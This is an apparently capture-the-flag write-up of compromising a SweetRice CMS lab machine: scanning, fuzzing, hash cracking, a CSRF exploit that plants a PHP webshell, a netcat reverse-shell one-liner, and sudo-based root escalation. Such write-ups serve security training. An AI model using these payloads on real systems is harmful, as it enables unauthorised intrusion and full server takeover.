
![](https://i.imgur.com/DkrBfaO.png)

## initial Enumeration

```bash
❯ nmap -sCV 10.10.115.33
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 01:26 WAT
Nmap scan report for 10.10.115.33
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.12 seconds
```

- visit port `80`:

![](https://i.imgur.com/kDjN4v9.png)

- now let FUZZ for hidden directory:
```bash
ffuf -u http://10.10.115.33/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 11321
```

![](https://i.imgur.com/WYKjB7P.png)

- we found `/contents` let see what's there:

![](https://i.imgur.com/R030OIj.png)

- nothing much there let `fuzz` for sub-directories here:

```bash
ffuf -u http://10.10.115.33/content/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -fs 2198
```

![](https://i.imgur.com/WT1SzvS.png)

- okay i was checking the directories one-by-one and found some cool stuff in the `/content/inc/` and `/content/as/`

![](https://i.imgur.com/VnmKlYN.png)

![](https://i.imgur.com/QfNHJ9s.png)

![](https://i.imgur.com/CoinEPP.png)

- i found a hash in the `databasefile` , now let crack it:
- the hash is likely an `md5` hash

![](https://i.imgur.com/dgaUifb.png)

![](https://i.imgur.com/VSBQzc2.png)

- no going to the `/content/as` directory it has a log-in form so i test the manager creds i just crack and it works:

![](https://i.imgur.com/sPeiSo6.png)


- from the above screen i was able to see the version of the `SweetRice` CMS, so i searched for possible exploit:

![](https://i.imgur.com/PL8CIpd.png)

![](https://i.imgur.com/swPQsTy.png)

- i edited the code to fit my need:

```html

<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.115.33/content/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://10.10.115.33/content/inc/ads/hacked.php
  -->
```

- i save the exploit into a `.html` file and on my terminal i run `Firefox <filename.html>` , this will open up Firefox and execute the payload against the `SweetRice` server:

![](https://i.imgur.com/i6RPt61.png)

- when it open up your Firefox click on the tick sign and visit  `http://10.10.115.33/content/inc/ads/hacked.php` to confirm the `POC`:

![](https://i.imgur.com/39fraQy.png)

- now i can modify the exploit to get a webshell/reverse shell:

```html 
<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.115.33/content/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="webshell"/>
<textarea type="hidden" name="adv">
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>

</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://10.10.115.33/content/inc/ads/webshell.php
  -->

```

- i save the exploit into a `.html` file and on my terminal i run `Firefox <filename.html>` , this will open up Firefox and execute the payload against the `SweetRice` server:

- when it open up Firefox don't forget to click on the tick box and visit the url `http://10.10.115.33/content/inc/ads/webshell.php`

![](https://i.imgur.com/OIa468B.png)

![](https://i.imgur.com/pEvNIhl.png)

- now i can start up a listener and enter in this reverse shell command:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.3.128 1337 >/tmp/f
```

![](https://i.imgur.com/mnUFDwM.png)

- stabilize shell with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL Z [KEY]
stty raw -echo;fg
export TERM=xterm
stty rows 40 cols 160
```

- now we are in we can move to the `/homes` directory to check if we have permission to read the user flag:

![](https://i.imgur.com/4Q49y7w.png)

- and surprisingly we do 😂

## privilege Escalation:

running `sudo -l` i see that the `itguy` user can run sudo with a perl binary combined ith a file in his directory:

![](https://i.imgur.com/k5SKVuP.png)

- but the `itguy` user don't have `WRITE` permission to the file only read
-  so i check the content of the file and found that that file is execute another file the the `itguy` has `WRITE` permissions too 🥲:

![](https://i.imgur.com/UrFXpjf.png)

- so what i we have to do is change the content of the `copy.sh` file to a reverse shell code so when it execute we will get a root shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.3.128 1336 >/tmp/f
```

![](https://i.imgur.com/OAuZM3n.png)

- then execute the command we have sudo privilege with (start listener first):

![](https://i.imgur.com/G9qNPig.png)

![](https://i.imgur.com/G6MBSWg.png)

- root flag:

![](https://i.imgur.com/teB0pG4.png)

## Thanks For reading 🤗
